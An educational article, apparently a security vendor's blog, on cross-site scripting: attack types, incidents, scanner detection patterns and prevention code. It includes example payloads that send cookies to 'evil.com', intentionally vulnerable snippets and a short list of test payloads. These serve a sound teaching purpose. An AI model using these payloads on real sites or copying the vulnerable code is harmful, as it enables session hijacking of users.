## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When successful, these scripts execute in the victim's browser, potentially stealing sensitive data, hijacking sessions, or performing actions on behalf of the user.

XSS consistently ranks in the OWASP Top 10 and affects millions of websites worldwide.

## Types of XSS Attacks

### 1. Reflected XSS (Non-Persistent)

The malicious script comes from the current HTTP request. It's "reflected" back to the user.

**Example Attack:**
```
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**Vulnerable Code:**
```javascript
// VULNERABLE - DO NOT USE
app.get('/search', (req, res) => {
  res.send(`<h1>Search results for: ${req.query.q}</h1>`);
});
```

### 2. Stored XSS (Persistent)

The malicious script is permanently stored on the target server (database, comment field, forum post). Every user who views the infected content becomes a victim.

**Example:**
An attacker posts a comment containing:
```html
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

### 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side. The malicious payload is executed by modifying the DOM environment.

**Vulnerable Code:**
```javascript
// VULNERABLE - DO NOT USE
document.getElementById('output').innerHTML = location.hash.substring(1);
```

**Attack:**
```
https://example.com/page#<img src=x onerror=alert('XSS')>
```

## Real-World XSS Impacts

- **Session Hijacking**: Stealing cookies to impersonate users
- **Credential Theft**: Injecting fake login forms
- **Malware Distribution**: Redirecting users to malicious sites
- **Defacement**: Modifying page content
- **Keylogging**: Recording user keystrokes

### Notable XSS Incidents

- **2018 British Airways**: XSS led to 380,000 payment card details stolen
- **2019 Fortnite**: Vulnerability could have exposed 200 million accounts
- **MySpace Samy Worm (2005)**: Self-propagating XSS worm infected 1 million profiles in 20 hours

## How CodeGuard AI Detects XSS

Our scanner identifies vulnerable patterns:

### 1. Unsafe HTML Insertion
```javascript
// We flag:
element.innerHTML = userInput;
document.write(userData);
$(selector).html(content);
```

### 2. Missing Output Encoding
```javascript
// We detect unencoded outputs in templates:
res.send(`<div>${userData}</div>`);
```

### 3. React dangerouslySetInnerHTML
```jsx
// We identify risky patterns:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
```

### 4. URL Parameter Injection
```javascript
// We flag URL construction with user input:
window.location = 'javascript:' + userInput;
```

## Prevention Strategies

### 1. Output Encoding (Escaping)

Always encode user data before rendering:

```javascript
// Encode for HTML context
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// Usage
res.send(`<div>${escapeHtml(userInput)}</div>`);
```

### 2. Content Security Policy (CSP)

Implement a strict CSP header to prevent inline script execution:

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

### 3. Use Safe APIs

```javascript
// UNSAFE
element.innerHTML = userInput;

// SAFE
element.textContent = userInput;
```

### 4. Framework-Specific Protection

**React** (auto-escapes by default):
```jsx
// Safe - automatically escaped
<div>{userInput}</div>

// DANGEROUS - avoid unless absolutely necessary
<div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
```

**Vue.js:**
```vue
<!-- Safe - automatically escaped -->
<div>{{ userInput }}</div>

<!-- DANGEROUS -->
<div v-html="userInput"></div>
```

### 5. Sanitize HTML When Necessary

When you must render HTML, use a sanitization library:

```javascript
import DOMPurify from 'dompurify';

// Sanitize HTML before rendering
const cleanHtml = DOMPurify.sanitize(userHtml);
element.innerHTML = cleanHtml;
```

### 6. HTTP-Only Cookies

Prevent JavaScript access to session cookies:

```javascript
res.cookie('sessionId', token, {
  httpOnly: true,  // Can't be accessed via JavaScript
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict'
});
```

## XSS Prevention Checklist

- [ ] Encode all user output based on context (HTML, JavaScript, URL, CSS)
- [ ] Implement Content Security Policy headers
- [ ] Use `textContent` instead of `innerHTML` where possible
- [ ] Sanitize any HTML that must be rendered
- [ ] Set `HttpOnly` flag on session cookies
- [ ] Validate and sanitize input on the server side
- [ ] Use modern frameworks that auto-escape by default
- [ ] Regularly scan code with CodeGuard AI

## Testing for XSS

Common test payloads:
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

## Conclusion

XSS vulnerabilities are entirely preventable with proper output encoding and security headers. Modern frameworks provide built-in protection, but developers must understand when that protection applies and when additional measures are needed.

Scan your codebase with CodeGuard AI to automatically detect XSS vulnerabilities before they reach production.
